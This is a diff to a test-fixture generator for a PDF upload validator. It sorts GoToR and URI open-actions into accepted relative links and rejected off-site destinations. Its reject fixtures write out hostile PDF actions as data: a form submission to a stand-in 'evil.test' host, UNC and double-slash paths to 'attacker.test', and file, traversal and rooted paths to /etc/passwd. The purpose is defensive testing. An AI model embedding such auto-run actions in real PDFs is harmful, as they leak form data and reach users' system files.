@@ -153,8 +153,50 @@ write("reject", "uri-file-scheme--other-than-a-web.pdf", document(
     catalog_extra=b"/OpenAction << /S /URI /URI (file:///C:/Windows/System32/calc.exe) >> "))
 write("reject", "submit-form--submits-form-data.pdf", document(
     catalog_extra=b"/OpenAction << /S /SubmitForm /F (https://evil.test/collect) >> "))
-write("reject", "remote-goto--opens-another-PDF.pdf", document(
+# GoToR is judged on WHERE it points, not on being a GoToR. A relative sibling document is
+# what a brochure linking to last year's brochure looks like.
+write("accept", "generated-goto-remote-relative.pdf", document(
     catalog_extra=b"/OpenAction << /S /GoToR /F (other.pdf) /D [0 /Fit] >> "))
+write("accept", "generated-goto-remote-relative-folder.pdf", document(
+    catalog_extra=b"/OpenAction << /S /GoToR /F (docs/2019/brochure.pdf) /D [0 /Fit] >> "))
+write("accept", "generated-goto-remote-https.pdf", document(
+    catalog_extra=b"/OpenAction << /S /GoToR /F (https://example.test/a.pdf) /D [0 /Fit] >> "))
+write("accept", "generated-goto-remote-filespec-dict.pdf", document(
+    catalog_extra=b"/OpenAction << /S /GoToR /F << /Type /Filespec /F (other.pdf) /UF (other.pdf) >> /D [0 /Fit] >> "))
+
+# ...and refused when the destination reaches off the site.
+# Written byte by byte on purpose. In a PDF string "\\" parses down to a single backslash, so a
+# genuine UNC prefix needs FOUR backslashes in the file. Writing two - the obvious thing - parses
+# to one backslash and is a rooted path, not a UNC path. That difference hid a real gap.
+_unc = (b"/OpenAction << /S /GoToR /F (" + b"\\" * 4 + b"attacker.test"
+        + b"\\" * 2 + b"share" + b"\\" * 2 + b"x.pdf) /D [0 /Fit] >> ")
+write("reject", "goto-remote-unc--another-computer.pdf", document(catalog_extra=_unc))
+
+_rooted = (b"/OpenAction << /S /GoToR /F (" + b"\\" * 2 + b"host"
+           + b"\\" * 2 + b"share.pdf) /D [0 /Fit] >> ")
+write("reject", "goto-remote-rooted-backslash--fixed-location.pdf", document(catalog_extra=_rooted))
+write("reject", "goto-remote-rooted-slash--fixed-location.pdf", document(
+    catalog_extra=b"/OpenAction << /S /GoToR /F (/etc/passwd) /D [0 /Fit] >> "))
+write("reject", "goto-remote-double-slash--another-computer.pdf", document(
+    catalog_extra=b"/OpenAction << /S /GoToR /F (//attacker.test/share/x.pdf) /D [0 /Fit] >> "))
+write("reject", "goto-remote-drive-letter--fixed-location.pdf", document(
+    catalog_extra=b"/OpenAction << /S /GoToR /F (C:/Windows/System32/calc.exe) /D [0 /Fit] >> "))
+write("reject", "goto-remote-traversal--outside-its-own-folder.pdf", document(
+    catalog_extra=b"/OpenAction << /S /GoToR /F (../../etc/passwd) /D [0 /Fit] >> "))
+write("reject", "goto-remote-file-scheme--address-this-site-does-not-allow.pdf", document(
+    catalog_extra=b"/OpenAction << /S /GoToR /F (file:///etc/passwd) /D [0 /Fit] >> "))
+write("reject", "goto-remote-no-target--destination-could-not-be-read.pdf", document(
+    catalog_extra=b"/OpenAction << /S /GoToR /D [0 /Fit] >> "))
+
+# Scheme-less and relative links are ordinary, not suspicious. There is no scheme to abuse.
+write("accept", "generated-link-relative-path.pdf", document(
+    catalog_extra=b"/OpenAction << /S /URI /URI (/docs/thing.pdf) >> "))
+write("accept", "generated-link-fragment.pdf", document(
+    catalog_extra=b"/OpenAction << /S /URI /URI (#page3) >> "))
+write("accept", "generated-link-no-scheme.pdf", document(
+    catalog_extra=b"/OpenAction << /S /URI /URI (www.example.test/a) >> "))
+write("accept", "generated-link-colon-in-path.pdf", document(
+    catalog_extra=b"/OpenAction << /S /URI /URI (docs/a:b.pdf) >> "))
 write("reject", "unknown-action-type--not-allowed.pdf", document(
     catalog_extra=b"/OpenAction << /S /SomethingNew >> "))
 write("reject", "embedded-file--attached-file.pdf", document(
